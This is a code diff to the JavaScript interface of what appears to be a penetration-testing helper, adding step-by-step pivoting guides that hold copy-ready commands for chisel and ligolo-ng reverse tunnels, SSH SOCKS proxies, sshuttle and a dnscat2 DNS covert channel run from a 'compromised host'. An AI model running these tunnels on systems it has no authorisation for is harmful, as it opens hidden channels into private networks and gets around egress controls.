@@ -224,6 +224,59 @@
     return steps ? '<div class="move-prep"><span class="mini-label">Set Up First</span>' + steps + '</div>' : '';
   }
 
+  // ---- pivot staging guide: multi-stage moves (tunnels and pivots) only make sense as a sequence
+  //      across TWO machines, and single commands out of context mislead. For these, show an authored
+  //      field-notes guide: ordered, machine-labelled, copy-ready, and tickable so you track where you
+  //      are in the setup. Authored here (presentation) rather than in the packs, like the Learn field
+  //      notes. Gated by move id so it never guesses a machine label it is not sure of. ----
+  var STAGING = {
+    'pivot-chisel-socks': { intro: 'Chisel builds a SOCKS tunnel: a server on your box, a client on the compromised host, then your tools ride through a proxy.', steps: [
+      { where: 'local', title: 'Start the chisel server on your Kali box', cmd: 'chisel server -p 8080 --reverse', note: 'Waits for the reverse connection and exposes a SOCKS proxy on 127.0.0.1:1080. Leave it running.' },
+      { where: 'host', title: 'Run the chisel client on the compromised host', cmd: './chisel client {{lhost}}:8080 R:socks', note: 'Transfer the chisel binary to the host first, then dial back. R:socks forwards a SOCKS5 tunnel through this box.' },
+      { where: 'local', title: 'Send your tools through the tunnel', cmd: 'proxychains -q nmap -sT -Pn <internal-ip>', note: 'Add "socks5 127.0.0.1 1080" to /etc/proxychains4.conf, then prefix tools with proxychains. Use -sT; SYN scans do not traverse SOCKS.' },
+    ] },
+    'pivot-ligolo': { intro: 'Ligolo-ng gives you a real routed interface into the hidden subnet: a proxy and tun on your box, an agent on the host, then a route.', steps: [
+      { where: 'local', title: 'Create the tun interface and start the proxy on Kali', cmd: 'sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert', note: 'One-time interface setup, then the proxy listens on 11601 for the agent.' },
+      { where: 'host', title: 'Run the agent on the compromised host', cmd: './agent -connect {{lhost}}:11601 -ignore-cert', note: 'Connects back to your proxy. In the proxy prompt run "session" and pick it.' },
+      { where: 'local', title: 'Route the internal subnet through the session', cmd: 'sudo ip route add <internal-cidr> dev ligolo', note: 'Then type "start" in the ligolo prompt. Your box now routes into the subnet, no proxychains needed.' },
+    ] },
+    'pivot-ssh-dynamic': { intro: 'An SSH dynamic port is the quickest SOCKS proxy when you already have SSH on the pivot.', steps: [
+      { where: 'local', title: 'Open a dynamic SOCKS port over SSH', cmd: 'ssh -D 1080 -N {{user}}@{{target}}', note: 'Opens a local SOCKS5 proxy on 1080 tunneled through the SSH session. -N means no shell.' },
+      { where: 'local', title: 'Send tools through proxychains', cmd: 'proxychains -q nmap -sT -Pn <internal-ip>', note: 'Point proxychains at socks5 127.0.0.1 1080.' },
+    ] },
+    'pivot-sshuttle': { intro: 'sshuttle transparently routes a subnet over SSH, with no proxychains and nothing to run on the host.', steps: [
+      { where: 'local', title: 'Route the subnet over SSH from your box', cmd: 'sshuttle -r {{user}}@{{target}} <internal-cidr>', note: 'Runs entirely from your Kali box over the SSH session; traffic to the subnet is transparently tunneled. Needs Python on the pivot.' },
+    ] },
+    'dns-tunnel': { intro: 'When only DNS resolves outbound, dnscat2 tunnels a channel over DNS: a server on your box, a client on the host.', steps: [
+      { where: 'local', title: 'Start the dnscat2 server on your box', cmd: 'dnscat2-server {{domain}}', note: 'Authoritative for the delegated domain; waits for tunneled sessions.' },
+      { where: 'host', title: 'Run the dnscat2 client on the compromised host', cmd: './dnscat2-client {{domain}}', note: 'Tunnels a command channel out over DNS queries when no other egress works.' },
+    ] },
+  };
+  function fillStage(cmd, params) {
+    params = params || {};
+    return String(cmd).replace(/\{\{(\w+)\}\}/g, function (m, k) { var v = params[k]; return (v !== undefined && v !== '') ? v : '<' + k + '>'; });
+  }
+  function stageDone(id, i) { try { return localStorage.getItem('obol.stage:' + id + ':' + i) === '1'; } catch (e) { return false; } }
+  function stagingGuide(action, params) {
+    var s = STAGING[action.id]; if (!s) return '';
+    var steps = s.steps.map(function (st, i) {
+      var done = stageDone(action.id, i), cmd = fillStage(st.cmd, params);
+      var whereLbl = st.where === 'host' ? 'On the target host' : 'On your Kali box';
+      return '<li class="stage-step stage-' + st.where + (done ? ' done' : '') + '">'
+        + '<button type="button" class="stage-check" data-stage="' + esc(action.id) + '" data-stage-i="' + i + '" role="checkbox" aria-checked="' + (done ? 'true' : 'false') + '" aria-label="Mark step ' + (i + 1) + ' done">' + (done ? '✓' : '') + '</button>'
+        + '<div class="stage-body"><div class="stage-wl"><span class="stage-n">' + (i + 1) + '</span>'
+        + '<span class="stage-where stage-where-' + st.where + '">' + whereLbl + '</span>'
+        + '<span class="stage-title">' + esc(st.title) + '</span></div>'
+        + '<div class="stage-cmd"><code>' + esc(cmd) + '</code><button class="btn-copy stage-copy" data-copy="' + U.attr(cmd) + '" title="Copy command">copy</button></div>'
+        + (st.note ? '<div class="stage-note">' + esc(st.note) + '</div>' : '')
+        + '</div></li>';
+    }).join('');
+    return '<details class="move-staging"><summary><span class="stage-sum-l">Setup guide</span>'
+      + '<span class="stage-sum-d">step by step, on your box and the host</span></summary>'
+      + (s.intro ? '<p class="stage-intro">' + esc(s.intro) + '</p>' : '')
+      + '<ol class="stage-steps">' + steps + '</ol></details>';
+  }
+
   function moveCard(action, facts, params, opts) {
     opts = opts || {};
     var why = U.firstSentence(action.hypothesis || action.proves || action.title);
@@ -250,6 +303,7 @@
       + '<p class="move-why">' + esc(why) + '</p>'
       + prepBlock(action, facts, dirs)
       + commandsBlock(action, filled)
+      + stagingGuide(action, params)
       + producesChips(action) + dnp
       + '<footer class="move-actions">'
       + '<button class="btn-ghost btn-pasteback" data-action="' + esc(action.id) + '" aria-expanded="false">Paste Output ↴</button>'
@@ -506,6 +560,15 @@
     });
     U.on(mount, 'click', '.btn-copy', function (e, t) {
       U.copy(t.getAttribute('data-copy')).then(function (ok) { U.toast(ok ? 'Command copied' : 'Copy failed', ok ? '' : 'err'); });
+    });
+    // pivot staging guide: tick a step done (in place, so the open guide and scroll are preserved)
+    U.on(mount, 'click', '[data-stage]', function (e, t) {
+      var id = t.getAttribute('data-stage'), i = t.getAttribute('data-stage-i'), key = 'obol.stage:' + id + ':' + i;
+      var was; try { was = localStorage.getItem(key) === '1'; localStorage.setItem(key, was ? '0' : '1'); } catch (x) { was = false; }
+      var on = !was;
+      t.setAttribute('aria-checked', on ? 'true' : 'false');
+      t.innerHTML = on ? '✓' : '';
+      var li = t.closest('.stage-step'); if (li) li.classList.toggle('done', on);
     });
     U.on(mount, 'click', '.cmd-miss-cmd', function (e, t) {
       U.copy(t.getAttribute('data-copy')).then(function (ok) { U.toast(ok ? 'Install command copied' : 'Copy failed', ok ? '' : 'err'); });
